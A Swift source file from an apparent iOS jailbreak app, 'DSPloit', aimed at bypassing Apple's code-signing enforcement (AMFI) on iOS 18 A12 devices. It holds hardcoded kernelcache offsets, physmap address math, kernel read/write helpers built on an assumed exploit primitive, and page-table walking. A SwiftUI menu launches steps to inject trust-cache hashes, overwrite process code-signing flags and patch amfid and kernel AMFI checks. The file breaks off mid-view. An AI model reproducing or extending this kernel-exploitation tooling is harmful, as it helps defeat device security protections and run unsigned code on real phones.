//
//  AMFIExperimentView.swift
//  DSPloit
//
//  AMFI Bypass Experiments — test binary execution from root context
//  Goal: find a way to execute unsigned binaries
//
//  NOTE: Experiments 1-53 removed (legacy probes). Only keeping 54-59 (active research).
//

import SwiftUI
import IOSurface

// MARK: - Physmap constants (saved when Exp 74 verifies)

private enum PhysmapConstants {
    private static let gVirtKey = "dsploit.physmap.gVirtBase"
    private static let gPhysKey = "dsploit.physmap.gPhysBase"
    private static let verifiedKey = "dsploit.physmap.verified"

    static let defaultGPhysBase: UInt64 = 0x800000000

    /// From kernelcache.release.iphone11b.decompressed (iOS 18 / A12 fileset, unslid).
    static let unslidTextBase: UInt64 = 0xfffffff007004000
    static let unslidDataBase: UInt64 = 0xfffffff00a0e0000
    static let dataOffsetFromText: UInt64 = 0x30dc000
    static let pplDataOffsetFromData: UInt64 = 0x8000

    static func dataSegmentBase(kernTextBase: UInt64) -> UInt64 {
        kernTextBase &+ dataOffsetFromText
    }

    static func pplDataSegmentBase(kernTextBase: UInt64) -> UInt64 {
        dataSegmentBase(kernTextBase: kernTextBase) &+ pplDataOffsetFromData
    }

    /// `kernel_pmap` global in __DATA (iphone11b kernelcache analyze — adjust per IPSW).
    static let kernelPmapOffsetInData: UInt64 = 0x3525e7

    /// pmap_cs_allow_invalid — ADRP target in kernelcache (iphone11b iOS 18).
    static let pmapCsAllowInvalidOffsetInData: UInt64 = 0x45b8

    /// __DATA slots referenced from AMFI code (analyze_kernelcache.py --trust-cache).
    /// Top slots from `analyze_kernelcache.py --trust-cache` (fast probe only).
    static let trustCacheFastOffsetsInData: [UInt64] = [
        0x3980, 0x3920, 0x3930, 0x2d0, 0x1a4, 0x2770, 0x38e0, 0x45b8,
    ]

    /// DATA globals only — jangan KRW-read simbol fungsi di __TEXT (respring A12).
    static let trustCacheKcacheDataSymbols: [String] = [
        "_trustcache",
    ]

    /// Full list (fallback only, capped at runtime).
    static let trustCacheGlobalOffsetsInData: [UInt64] = [
        0x45b8, 0x3980, 0x2d0, 0x1a4, 0x2770, 0x1f8, 0x48, 0xb4, 0x38e0, 0x68,
        0x24c, 0x2a0, 0x2f8, 0xc8, 0x3920, 0x3930, 0x208, 0x2780, 0x27ad, 0x38,
        0x2828, 0x280e, 0x28, 0x1c8, 0x2838, 0x38c0, 0x38a0, 0x8, 0x1dc, 0x1e8,
        0x1d8, 0x1e4, 0x2860, 0x2788, 0x2798, 0x308, 0x18, 0x2f0, 0x1b8, 0x1e0,
        0x3900, 0x2878, 0x38b0, 0x2898, 0xa0, 0x1310, 0x1320, 0x39b0,
        // High ADRP ref (script lists but skips in pick — still worth probing)
        0xe8, 0x248, 0xf8,
    ]

    /// From kernelcache string table; XPF "base" set may not index these — ChOma names for logging only.
    static let trustCacheXpfSymbols: [String] = [
        "_trustcache",
        "_query_trust_cache",
        "_query_trust_cache_for_rem",
        "_check_cdhash_in_trustcache",
        "_check_trust_cache_runtime_for_uuid",
        "_load_trust_cache",
        "_load_trust_cache_with_type",
        "_pmap_lookup_in_loaded_trust_caches",
        "_pmap_lookup_in_static_trust_cache",
        "trust_cache_init",
        "kernelSymbol.trust_cache",
        "kernelSymbol.query_trust_cache",
    ]

    static func kernelPmapFromGlobal(kernTextBase: UInt64) -> UInt64 {
        let ptr = ds_kreadptr(dataSegmentBase(kernTextBase: kernTextBase) &+ kernelPmapOffsetInData)
        guard ptr != 0, ptr > 0xffffffdc00000000 else { return 0 }
        return ptr
    }

    /// gVirt estimate without reading physmap/DRAM (avoids respring on Exp 74).
    static func gVirtBaseEstimate(ourProc: UInt64) -> (gVirt: UInt64, source: String) {
        if let saved = load() {
            return (saved.gVirtBase, "saved")
        }
        let est = estimateZoneMapBase(ourProc: ourProc)
        if est >= 0xffffffdc00000000 && est < 0xffffffe500000000 {
            return (est & 0xfffffffc00000000, "proc_est (kernelcache)")
        }
        return (0xffffffdcda524000, "kernelcache default (A12)")
    }

    static func save(gVirtBase: UInt64, gPhysBase: UInt64) {
        UserDefaults.standard.set(String(format: "%llx", gVirtBase), forKey: gVirtKey)
        UserDefaults.standard.set(String(format: "%llx", gPhysBase), forKey: gPhysKey)
        UserDefaults.standard.set(true, forKey: verifiedKey)
        clearProbeOK()
    }

    static func load() -> (gVirtBase: UInt64, gPhysBase: UInt64)? {
        guard UserDefaults.standard.bool(forKey: verifiedKey),
              let vStr = UserDefaults.standard.string(forKey: gVirtKey),
              let pStr = UserDefaults.standard.string(forKey: gPhysKey),
              let gVirtBase = UInt64(vStr, radix: 16),
              let gPhysBase = UInt64(pStr, radix: 16) else { return nil }
        return (gVirtBase, gPhysBase)
    }

    static func loadOrDefault() -> (gVirtBase: UInt64, gPhysBase: UInt64) {
        if let saved = load() { return saved }
        let proc = ds_get_our_proc()
        return (estimateZoneMapBase(ourProc: proc), defaultGPhysBase)
    }

    /// Rough zone_map hint from proc (often too high — use scan candidates in Exp 74).
    static func estimateZoneMapBase(ourProc: UInt64) -> UInt64 {
        guard ourProc > 0xffffffd000000000 else { return 0xffffffdcda524000 }
        let block = ourProc & 0xFFFFFFFFF0000000
        return block &- 0x31ADD000
    }

    /// gVirtBase candidates: physmap lives in 0xffffffdc..0xffffffe2, NOT near proc (0xe2+).
    static func gVirtBaseCandidates(ourProc: UInt64, tte: UInt64) -> [(String, UInt64)] {
        var out: [(String, UInt64)] = []
        var seen = Set<UInt64>()

        func add(_ name: String, _ value: UInt64) {
            guard value > 0xffffffdc00000000, seen.insert(value).inserted else { return }
            out.append((name, value))
        }

        if let saved = load()?.gVirtBase { add("saved", saved) }
        add("proc_est", estimateZoneMapBase(ourProc: ourProc))
        add("tte_align_1g", tte & 0xfffffffc00000000)
        add("tte_align_256m", tte & 0xfffffffe00000000)

        var g = UInt64(0xffffffdc00000000)
        while g < 0xffffffe200000000 {
            add("physmap_scan", g)
            g &+= 0x04000000
        }

        return out
    }

    static var isVerified: Bool { UserDefaults.standard.bool(forKey: verifiedKey) }

    private static let probeOKKey = "dsploit.physmap.probeOK"

    static func markProbeOK() {
        UserDefaults.standard.set(true, forKey: probeOKKey)
    }

    static func clearProbeOK() {
        UserDefaults.standard.removeObject(forKey: probeOKKey)
    }

    static var isProbeOK: Bool { UserDefaults.standard.bool(forKey: probeOKKey) }

    static var statusSummary: String {
        if let p = load() {
            return "gVirt=0x\(String(format: "%llx", p.gVirtBase)) gPhys=0x\(String(format: "%llx", p.gPhysBase))"
        }
        return "Jalankan Physmap Verify (Exp 74) dulu"
    }
}

// MARK: - Kernel pmap (for page table walks on kernel VA)

private struct KernelPmapChain {
    let kernProc: UInt64
    let task: UInt64
    let vmMap: UInt64
    let pmap: UInt64
    let tte: UInt64
    let tteField: String
}

/// Kernel/physmap VA (PAC-stripped). iOS 18 pmap may store L1 at +0x00 or +0x08.
private func isKernelOrPhysmapVA(_ v: UInt64) -> Bool {
    if v == 0 { return false }
    if v >= 0xffffff8000000000 { return true }
    if v >= 0xffffffdc00000000 && v < 0xffffffe500000000 { return true }
    // PAC residue (screenshot: 0xfffffe0… before xpaci)
    if (v >> 40) == 0xfffffe || (v >> 40) == 0xffffff { return true }
    return false
}

private func isReasonablePhysTT(_ v: UInt64) -> Bool {
    v >= 0x800000000 && v < 0x1000000000
}

/// Socket KRW must not touch garbage VAs — caused panic: copy_validate_kernel_addr(0xfffffffbffffffff).
private func isSafePhysmapKRWAddress(_ va: UInt64) -> Bool {
    guard va >= 0xffffffdd00000000 && va < 0xffffffe500000000 else { return false }
    if va >= 0xfffffffa00000000 { return false }
    return true
}

private func physmapVA(fromPhysical phys: UInt64, gVirt: UInt64, gPhys: UInt64, offset: UInt64 = 0) -> UInt64? {
    guard isReasonablePhysTT(phys) else { return nil }
    let va = phys &- gPhys &+ gVirt &+ offset
    guard isSafePhysmapKRWAddress(va) else { return nil }
    return va
}

private func safeKread64Physmap(_ va: UInt64) -> UInt64 {
    guard isSafePhysmapKRWAddress(va) else { return 0 }
    return ds_kread64_safe(va)
}

/// Kernel __TEXT / __DATA / fileset aux (0xffffff80… and legacy 0xfffffff0…).
private func isSafeKernelKreadAddress(_ va: UInt64) -> Bool {
    if va >= 0xfffffffa00000000 { return false }
    
    // For iOS 15-18, Kernel text/data is always at 0xfffffff0...
    if va >= 0xfffffff000000000 && va < 0xfffffffc00000000 { return true }
    
    // For older iOS versions, kernel text might be at 0xffffff80...
    // But we MUST exclude 0xffffffdc... to 0xffffffe5... (Zone Map / Physmap)
    // because unmapped reads there cause Kernel Data Abort panics.
    if va >= 0xffffff8000000000 && va < 0xffffffdc00000000 { return true }
    
    return false
}

/// kalloc heap (amfid/proc/trust cache — 0xdd/0xde/0xe0…). Jangan pakai aturan physmap 0xdc–0xe6 di sini.
private func isSafeKernelHeapKreadAddress(_ va: UInt64) -> Bool {
    if va >= 0xfffffffa00000000 { return false }
    // Zone map on iOS 15-18 is typically 0xffffffdc... to 0xffffffe2...
    // DO NOT allow 0xfffffff0... here because it contains MMIO (I/O registers) which causes LLC Bus Error panic if read!
    // Start from 0xffffffdd to explicitly exclude the VM, Metadata, and Bitmaps regions in 0xffffffdc which can trigger Data Abort panics.
    // End at 0xffffffe5 to explicitly exclude Metadata / Bitmaps regions which start at 0xffffffe7...
    let isZoneMap = va >= 0xffffffdd00000000 && va < 0xffffffe500000000
    guard isZoneMap else { return false }
    if let gVirt = PhysmapConstants.load()?.gVirtBase {
        if va >= gVirt, va < gVirt &+ 0x80000000 { return false }
    }
    return true
}

/// __DATA.__ppl_data — KRW read → "Unexpected fault in kernel static region" (A12 PPL).
private func isInPPLDataRegion(_ va: UInt64, kernTextBase: UInt64) -> Bool {
    let ppl = PhysmapConstants.pplDataSegmentBase(kernTextBase: kernTextBase)
    return va >= ppl && va < ppl + 0x100000
}

/// Trust cache runtime object is heap (kalloc), not static __DATA / __ppl_data.
private func isLikelyTrustCacheHeapPointer(_ v: UInt64, kernTextBase: UInt64) -> Bool {
    guard isSafeKernelHeapKreadAddress(v) else { return false }
    return !isInPPLDataRegion(v, kernTextBase: kernTextBase)
}

/// Antara __TEXT utama dan __DATA (komponen fileset lain: AMFI, trustcache, …).
private func isFilesetAuxDataVA(_ va: UInt64, kernTextBase: UInt64, dataSegBase: UInt64) -> Bool {
    guard va >= kernTextBase, va < dataSegBase else { return false }
    return !isInPPLDataRegion(va, kernTextBase: kernTextBase)
}

/// Exp 77: heap, __DATA pre-PPL, atau fileset aux (pointer dari kc+0x3980 dll.).
private func isSafeTrustCacheStructVA(
    _ va: UInt64,
    dataSegBase: UInt64,
    pplDataBase: UInt64,
    kernTextBase: UInt64
) -> Bool {
    if isInPPLDataRegion(va, kernTextBase: kernTextBase) { return false }
    if isSafeKernelHeapKreadAddress(va) { return true }
    if va >= dataSegBase && va < pplDataBase { return true }
    return isFilesetAuxDataVA(va, kernTextBase: kernTextBase, dataSegBase: dataSegBase)
}

/// Pointer dari slot __DATA — ikuti ke heap / __DATA / fileset aux (bukan alamat fungsi di __TEXT).
private func isSafeTrustCacheFollowPointer(
    _ ptr: UInt64,
    dataSegBase: UInt64,
    pplDataBase: UInt64,
    kernTextBase: UInt64
) -> Bool {
    guard isLikelyKernelObjectPointer(ptr) else { return false }
    return isSafeTrustCacheStructVA(ptr, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernTextBase)
}

/// Skip integers / flags (e.g. pmap_cs_allow_invalid = 1 at kc+0x45b8).
private func isLikelyKernelObjectPointer(_ v: UInt64) -> Bool {
    if v < 0x100000 { return false }
    return isLikelyKernelPointer(v)
}

/// iOS 18 trust cache entry layout (24 bytes):
///   [0..19]  CDHash (20 bytes, SHA1 atau truncated SHA256)
///   [20]     hashType: 1=SHA1, 2=SHA256-truncated
///   [21]     flags
///   [22..23] padding
///
/// Heuristik: count harus masuk akal (>= 5), dan setidaknya SATU dari
/// beberapa entry pertama harus punya entropy CDHash yang wajar.
private func trustCacheEntriesPlausible(
    hdrVA: UInt64,
    count: UInt32,
    dataSegBase: UInt64,
    pplDataBase: UInt64,
    kernTextBase: UInt64
) -> Bool {
    // count < 5 = false positive (struct lain yang kebetulan lolos ver/count check)
    // count > 200k = tidak masuk akal
    guard count >= 5, count <= 200_000 else { return false }
    let heap = isSafeKernelHeapKreadAddress(hdrVA)
    let r32: (UInt64) -> UInt32 = { heap ? safeKread32Heap($0) : safeKread32Kernel($0) }
    let r64: (UInt64) -> UInt64 = { heap ? safeKread64Heap($0) : safeKread64Kernel($0) }

    // Coba stride 24 dan 32 — iOS 18 pakai salah satu
    for stride: UInt64 in [24, 32] {
        let e0 = hdrVA &+ 8
        guard isSafeTrustCacheStructVA(e0 &+ stride - 1, dataSegBase: dataSegBase,
                                       pplDataBase: pplDataBase, kernTextBase: kernTextBase)
        else { continue }

        // Cek beberapa entry (bukan hanya entry[0]) — entry pertama mungkin metadata
        var entriesWithEntropy = 0
        let checkCount = min(Int(count), 8)

        for i in 0..<checkCount {
            let ef = e0 &+ UInt64(i) * stride
            guard isSafeTrustCacheStructVA(ef &+ 16, dataSegBase: dataSegBase,
                                           pplDataBase: pplDataBase, kernTextBase: kernTextBase)
            else { break }

            let h0 = r64(ef)
            let h1 = r64(ef &+ 8)
            let h2 = r32(ef &+ 16)

            // Semua nol = belum diisi
            if h0 == 0 && h1 == 0 && h2 == 0 { continue }

            // CDHash harus punya entropy: setidaknya beberapa byte non-trivial
            // Longgarkan: cukup 1 dari 3 word punya nilai > 0xFFFF
            let h0entropy = h0 > 0x0000_FFFF
            let h1entropy = h1 > 0x0000_FFFF
            let h2entropy = h2 > 0x00FF
            if h0entropy || h1entropy || h2entropy {
                entriesWithEntropy += 1
            }
        }

        // Minimal 2 entry dari 8 yang dicek harus punya entropy
        // (lebih longgar dari sebelumnya yang butuh 2 dari 3 word per entry)
        if entriesWithEntropy >= 2 {
            return true
        }
    }
    return false
}

private func safeKread64Kernel(_ va: UInt64) -> UInt64 {
    guard isSafeKernelKreadAddress(va) else { return 0 }
    return ds_kread64_safe(va)
}

private func safeKread32Kernel(_ va: UInt64) -> UInt32 {
    guard isSafeKernelKreadAddress(va) else { return 0 }
    return ds_kread32_safe(va)
}

private func safeKread64Heap(_ va: UInt64) -> UInt64 {
    guard isSafeKernelHeapKreadAddress(va) else { return 0 }
    return ds_kread64_safe(va)
}

private func safeKread32Heap(_ va: UInt64) -> UInt32 {
    guard isSafeKernelHeapKreadAddress(va) else { return 0 }
    return ds_kread32_safe(va)
}

private func safeKwrite64Physmap(_ va: UInt64, _ value: UInt64) -> Bool {
    guard isSafePhysmapKRWAddress(va) else { return false }
    ds_kwrite64(va, value)
    return true
}

private func safeKwrite32Physmap(_ va: UInt64, _ value: UInt32) -> Bool {
    guard isSafePhysmapKRWAddress(va) else { return false }
    ds_kwrite32(va, value)
    return true
}

private func safeKwrite16Physmap(_ va: UInt64, _ value: UInt16) -> Bool {
    guard isSafePhysmapKRWAddress(va) else { return false }
    ds_kwrite16(va, value)
    return true
}

private func safeKwrite64Heap(_ va: UInt64, _ value: UInt64) -> Bool {
    guard isSafeKernelHeapKreadAddress(va) else { return false }
    ds_kwrite64(va, value)
    return true
}

private func safeKwrite32Heap(_ va: UInt64, _ value: UInt32) -> Bool {
    guard isSafeKernelHeapKreadAddress(va) else { return false }
    ds_kwrite32(va, value)
    return true
}

private func safeKwrite16Heap(_ va: UInt64, _ value: UInt16) -> Bool {
    guard isSafeKernelHeapKreadAddress(va) else { return false }
    ds_kwrite16(va, value)
    return true
}

private func isLikelyKernelPointer(_ v: UInt64) -> Bool {
    if v == 0 { return false }
    if v >= 0xffffff8000000000 { return true }
    if v >= 0xffffffdc00000000 && v < 0xffffffe600000000 { return true }
    return false
}

/// Score pmap candidates (+0x00 tte, +0x08 ttep — Exp 75 checks +0x08 first).
private func pmapCandidateScore(_ pmap: UInt64) -> Int {
    guard isLikelyKernelPointer(pmap) else { return 0 }
    var score = 1
    let p0 = ds_kreadptr(pmap)
    let p8 = ds_kreadptr(pmap + 8)
    if p0 == pmap { score += 1 } // user pmap quirk; L1 may be at +0x08
    else if isKernelOrPhysmapVA(p0) { score += 4 }
    if isKernelOrPhysmapVA(p8) { score += 5 }
    if isReasonablePhysTT(p8) { score += 4 }
    if isReasonablePhysTT(p0) { score += 3 }
    return score
}

/// Wide scan vm_map + task for pmap (kernel vm_map often ≠ +0x50 only).
private func findPmapPointer(vmMap: UInt64, task: UInt64, detail: inout String) -> UInt64? {
    var best: (addr: UInt64, score: Int, label: String)?

    func consider(_ addr: UInt64, _ label: String) {
        let sc = pmapCandidateScore(addr)
        guard sc >= 3 else { return }
        if best == nil || sc > best!.score {
            best = (addr, sc, label)
        }
    }

    if vmMap != 0 {
        detail += "Scanning vm_map 0x\(String(format: "%llx", vmMap)) for pmap...\n"
        for off in stride(from: UInt64(0), to: 0xC0, by: 8) {
            let p = ds_kreadptr(vmMap + off)
            if isLikelyKernelPointer(p) {
                let sc = pmapCandidateScore(p)
                if sc >= 3 {
                    detail += "  map+0x\(String(format: "%02x", off)): 0x\(String(format: "%llx", p)) score=\(sc)\n"
                    consider(p, "vm_map+0x\(String(format: "%x", off))")
                }
            }
        }
    }

    detail += "Scanning task 0x\(String(format: "%llx", task)) for pmap...\n"
    for off in stride(from: UInt64(0x20), to: 0x98, by: 8) {
        let p = ds_kreadptr(task + off)
        if isLikelyKernelPointer(p) {
            let sc = pmapCandidateScore(p)
            if sc >= 4 {
                detail += "  task+0x\(String(format: "%02x", off)): 0x\(String(format: "%llx", p)) score=\(sc)\n"
                consider(p, "task+0x\(String(format: "%x", off))")
            }
        }
    }

    if let b = best {
        detail += "✅ pmap from \(b.label): 0x\(String(format: "%llx", b.addr)) (score \(b.score))\n\n"
        return b.addr
    }

    if vmMap != 0 {
        detail += "vm_map dump (pmap not found):\n"
        for off in stride(from: UInt64(0), to: 0x60, by: 8) {
            detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", ds_kread64_safe(vmMap + off)))\n"
        }
        detail += "\n"
    }
    return nil
}

/// L1 page table root from pmap (+0x00 tte VA, +0x08 ttep/alt, PAC via ds_kreadptr).
private func resolvePmapL1Root(pmap: UInt64, detail: inout String) -> (va: UInt64, field: String)? {
    detail += "pmap struct dump (ds_kreadptr = PAC stripped):\n"
    var best: (UInt64, String)?
    for off: UInt64 in stride(from: 0, to: 0x40, by: 8) {
        let raw = ds_kread64_safe(pmap + off)
        let ptr = ds_kreadptr(pmap + off)
        let tag: String
        if isKernelOrPhysmapVA(ptr) { tag = " ← L1 VA?" }
        else if isReasonablePhysTT(ptr) { tag = " ← phys?" }
        else { tag = "" }
        detail += "  +0x\(String(format: "%02x", off)): raw=0x\(String(format: "%016llx", raw)) ptr=0x\(String(format: "%016llx", ptr))\(tag)\n"
    }
    detail += "\n"

    // +0x08 first — iOS 18 / Exp 75 often has TTBR at pmap+0x08
    for (off, name) in [(UInt64(8), "+0x08 ttep/alt"), (UInt64(0), "+0x00 tte"), (UInt64(0x10), "+0x10")] {
        let v = ds_kreadptr(pmap + off)
        if v == pmap { continue }
        if isKernelOrPhysmapVA(v) {
            detail += "✅ L1 root from \(name): 0x\(String(format: "%llx", v))\n"
            return (v, name)
        }
    }
    for (off, name) in [(UInt64(8), "+0x08"), (UInt64(0), "+0x00")] {
        let v = ds_kreadptr(pmap + off)
        if isReasonablePhysTT(v) {
            detail += "⚠️ Physical L1 at \(name): 0x\(String(format: "%llx", v)) (need gVirtBase to map)\n"
            if best == nil { best = (v, "\(name) phys") }
        }
    }
    if let b = best { return (b.0, b.1) }
    detail += "❌ No valid L1 at pmap+0x00/+0x08 (user pmap often has tte=0 — try kernproc pmap)\n"
    return nil
}

/// Exp 74 verify — NO brute-force physmap KRW scan (caused panic at 0xfffffffbffffffff).
@discardableResult
private func verifyPhysmapSafe(
    kernBase: UInt64,
    kernMagic: UInt64,
    ourProc: UInt64,
    tte: UInt64,
    detail: inout String
) -> (gVirtBase: UInt64, gPhysBase: UInt64)? {
    let gPhysBase = PhysmapConstants.defaultGPhysBase

    detail += "=== Physmap verify (minimal KRW — no zone/DRAM read) ===\n"
    detail += "Menghindari respring: tidak baca physmap/DRAM/pmap (hanya __TEXT + estimasi).\n\n"

    guard (kernMagic & 0xFFFFFFFF) == 0xFEEDFACF else {
        detail += "❌ KRW tidak bisa baca kernel __TEXT (Mach-O)\n"
        return nil
    }
    detail += "✅ KRW reads kernel __TEXT at 0x\(String(format: "%llx", kernBase))\n"

    var (gVirt, source) = PhysmapConstants.gVirtBaseEstimate(ourProc: ourProc)

    if tte != 0, isKernelOrPhysmapVA(tte), source != "saved" {
        let aligned = tte & 0xfffffffc00000000
        if aligned >= 0xffffffdc00000000 && aligned < 0xffffffe500000000 {
            let ttep = tte &- aligned &+ gPhysBase
            if ttep >= 0x800000000 && ttep < 0x900000000 {
                gVirt = aligned
                source = "tte_align (offline hint)"
            }
        }
    }

    detail += "gVirtBase: 0x\(String(format: "%llx", gVirt)) (\(source))\n"
    detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n"
    detail += "(DRAM/physmap KRW probe disabled — caused respring on some boots)\n"

    detail += "\n🎉 PHYSMAP CONSTANTS SET\n"
    detail += "physmap_slide = 0x\(String(format: "%llx", gVirt &- gPhysBase))\n"
    detail += "→ Lanjut ② Trust Cache Probe\n\n"
    PhysmapConstants.save(gVirtBase: gVirt, gPhysBase: gPhysBase)
    return (gVirt, gPhysBase)
}

/// Page table root for kernel virtual addresses — must use kernproc, not our_proc.
private func resolveKernelPmapChain(detail: inout String) -> KernelPmapChain? {
    let kernProc = ds_get_kern_proc()
    guard kernProc != 0 else {
        detail += "❌ ds_get_kern_proc() failed (check offsets / kernproc symbol)\n"
        return nil
    }
    detail += "kernproc: 0x\(String(format: "%llx", kernProc))\n"

    let task = taskbyproc(kernProc)
    guard task != 0 else {
        detail += "❌ taskbyproc(kernproc) failed\n"
        return nil
    }
    detail += "kernel task: 0x\(String(format: "%llx", task))\n"

    var vmMap = task_get_vm_map(task)
    if vmMap == 0 {
        for off: UInt64 in [0x28, 0x30, 0x20, 0x38, 0x40] {
            let c = ds_kread64_safe(task + off)
            if c > 0xffffffdc00000000 && c < 0xffffffe500000000 {
                let fwd = ds_kread64_safe(c + 0x10)
                if fwd != 0 {
                    vmMap = c
                    detail += "kernel vm_map (scan +0x\(String(format: "%x", off))): 0x\(String(format: "%llx", c))\n"
                    break
                }
            }
        }
    } else {
        detail += "kernel vm_map (off_task_map): 0x\(String(format: "%llx", vmMap))\n"
    }

    var pmap: UInt64 = 0
    let kernBase = ds_get_kernel_base()
    let globalPmap = PhysmapConstants.kernelPmapFromGlobal(kernTextBase: kernBase)
    if globalPmap != 0 {
        pmap = globalPmap
        detail += "kernel_pmap (kernelcache __DATA+0x\(String(format: "%x", PhysmapConstants.kernelPmapOffsetInData))): 0x\(String(format: "%llx", pmap))\n"
    }

    if pmap == 0 {
        guard vmMap != 0 else {
            detail += "❌ kernel vm_map not found\n"
            return nil
        }
        guard let found = findPmapPointer(vmMap: vmMap, task: task, detail: &detail) else {
            detail += "❌ kernel pmap not found (wide scan vm_map+task)\n"
            return nil
        }
        pmap = found
    }

    guard let l1 = resolvePmapL1Root(pmap: pmap, detail: &detail) else {
        return nil
    }

    var l1VA = l1.va
    var field = l1.field
    if !isKernelOrPhysmapVA(l1VA), isReasonablePhysTT(l1VA), let saved = PhysmapConstants.load() {
        l1VA = l1VA &- saved.gPhysBase &+ saved.gVirtBase
        field = "\(l1.field) → physmap VA"
        detail += "Converted phys L1 → physmap VA: 0x\(String(format: "%llx", l1VA))\n"
    }

    guard isKernelOrPhysmapVA(l1VA) else {
        detail += "❌ kernel L1 not usable (tte=0 at +0x00 — run Exp 74 brute scan first)\n"
        return nil
    }
    detail += "kernel L1 (\(field)): 0x\(String(format: "%llx", l1VA))\n\n"

    return KernelPmapChain(kernProc: kernProc, task: task, vmMap: vmMap, pmap: pmap, tte: l1VA, tteField: field)
}

struct AMFIExperimentView: View {
    @ObservedObject private var root = RootExecutor.shared
    @ObservedObject private var mgr = dspmgr.shared
    
    @State private var results: [ExperimentResult] = []
    @State private var isRunning = false
    @State private var runningLabel = ""
    @State private var customBinary = "/usr/bin/id"
    // Exp 79: simpan hasil probe untuk dipakai inject
    @State private var probedTCAddr: UInt64 = 0
    @State private var probedTCCount: UInt32 = 0
    @State private var probedTCStride: UInt32 = 24

    struct ExperimentResult: Identifiable {
        let id = UUID()
        let name: String
        let success: Bool
        let detail: String
        let timestamp: Date
    }
    
    var body: some View {
        List {
            // Status Banner
            if isRunning {
                Section {
                    HStack(spacing: 10) {
                        ProgressView()
                            .tint(.red)
                        VStack(alignment: .leading, spacing: 2) {
                            Text("Running: \(runningLabel)")
                                .font(.caption.bold())
                                .foregroundStyle(.red)
                            Text("Do NOT close app — will cause panic!")
                                .font(.system(size: 9))
                                .foregroundStyle(.orange)
                        }
                    }
                    .padding(.vertical, 4)
                }
            }
            
            // Jailbreak path (sequential — after Exp 74 success)
            Section {
                Text(PhysmapConstants.statusSummary)
                    .font(.system(size: 10, design: .monospaced))
                    .foregroundStyle(PhysmapConstants.isVerified ? .green : .orange)

                pathButton(
                    title: "① Physmap Verify (Exp 74)",
                    icon: "map.fill",
                    color: .cyan,
                    label: "Physmap",
                    action: runExp74,
                    needsVerified: false
                )

                pathButton(
                    title: "② Trust Cache Probe (Exp 77 read-only)",
                    icon: "magnifyingglass.circle.fill",
                    color: .mint,
                    label: "TC Probe",
                    action: runExp77Probe,
                    needsVerified: true
                )

                pathButton(
                    title: "③ KTRR Analysis (Exp 79 — info only)",
                    icon: "lock.shield.fill",
                    color: .yellow,
                    label: "KTRR",
                    action: runExp79WriteTest,
                    needsVerified: true,
                    needsProbe: true
                )

                pathButton(
                    title: "③b RC Trust Cache Add (Exp 80)",
                    icon: "key.fill",
                    color: .orange,
                    label: "RC TC Add",
                    action: runExp80RCTrustCacheAdd,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③c Heap TC Analysis (Exp 81)",
                    icon: "doc.text.magnifyingglass",
                    color: .pink,
                    label: "Heap TC",
                    action: runExp81HeapTCAnalysis,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③d Deep TC Scan (Exp 82)",
                    icon: "memorychip",
                    color: .cyan,
                    label: "Deep TC",
                    action: runExp82DeepTCScan,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③e CS Flags Bypass (Exp 83)",
                    icon: "shield.lefthalf.filled",
                    color: .purple,
                    label: "CS Flags",
                    action: runExp83CSFlagsBypass,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③f amfid Patch (Exp 84)",
                    icon: "waveform.badge.exclamationmark",
                    color: .red,
                    label: "amfid",
                    action: runExp84AmfidPatch,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③g Kernel AMFI Patch (Exp 85)",
                    icon: "bolt.trianglebadge.exclamationmark",
                    color: .red,
                    label: "Kern AMFI",
                    action: runExp85KernelAmfiPatch,
                    needsVerified: true,
                    needsProbe: false
                )

                pathButton(
                    title: "③h Ad-hoc Sign + Spawn (Exp 86)",
                    icon: "signature",
                    color: .yellow,
                    label: "AdHoc",
                    action: runExp86AdHocSpawn,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "④ Test Binary Spawn",
                    icon: "terminal.fill",
                    color: .indigo,
                    label: "Spawn",
                    action: { testSingleBinary(customBinary) },
                    needsVerified: false
                )

                TextField("Binary path", text: $customBinary)
                    .font(.system(.caption, design: .monospaced))
            } header: {
                Label("Jailbreak Path", systemImage: "flag.checkered")
            } footer: {
                Text("② Probe pakai offset kernelcache + XPF. ③ KTRR Analysis: info saja, tidak write. ③b RC TC Add: inject CDHash via launchd RemoteCall (PPL-safe). ③e CS Flags: write cs_flags via physmap ke proc_ro binary target (bypass KTRR). ③f amfid Patch: patch amfid text via physmap untuk skip signature check.")
                    .font(.system(size: 9))
            }

            Section {
                Button(action: runAmfidRC) {
                    HStack {
                        Label("amfid RC (Exp 60)", systemImage: "bolt.shield")
                            .foregroundStyle(isRunning ? .gray : .orange)
                        Spacer()
                        if isRunning && runningLabel.contains("amfid") {
                            ProgressView().scaleEffect(0.7)
                        }
                    }
                }
                .disabled(isRunning || !mgr.rcready)

                Button(action: runExp78) {
                    HStack {
                        Label("DART PTE Probe (Exp 78)", systemImage: "cpu")
                            .foregroundStyle(isRunning ? .gray : .purple)
                        Spacer()
                        if isRunning && runningLabel.contains("DART") {
                            ProgressView().scaleEffect(0.7)
                        }
                    }
                }
                .disabled(isRunning || !mgr.rcready)

                Button(action: runDumpAmfid) {
                    HStack {
                        Label("Dump amfid binary", systemImage: "arrow.down.doc")
                            .foregroundStyle(isRunning ? .gray : .green)
                        Spacer()
                        if isRunning && runningLabel.contains("Dump") {
                            ProgressView().scaleEffect(0.7)
                        }
                    }
                }
                .disabled(isRunning || !mgr.rcready)
            } header: {
                Label("Advanced", systemImage: "flask")
            } footer: {
                Text("Exp 60/78 opsional. Dump amfid: copy /usr/libexec/amfid ke Documents (ambil via Files app).")
                    .font(.system(size: 9))
            }
            
            // Results
            if !results.isEmpty {
                Section {
                    ForEach(results) { r in
                        VStack(alignment: .leading, spacing: 4) {
                            HStack {
                                Image(systemName: r.success ? "checkmark.circle.fill" : "xmark.circle.fill")
                                    .foregroundStyle(r.success ? .green : .red)
                                Text(r.name)
                                    .font(.caption.bold())
                                Spacer()
                                Text(r.timestamp, style: .time)
                                    .font(.system(size: 8))
                                    .foregroundStyle(.tertiary)
                            }
                            Text(r.detail)
                                .font(.system(size: 10, design: .monospaced))
                                .foregroundStyle(.secondary)
                                .textSelection(.enabled)
                        }
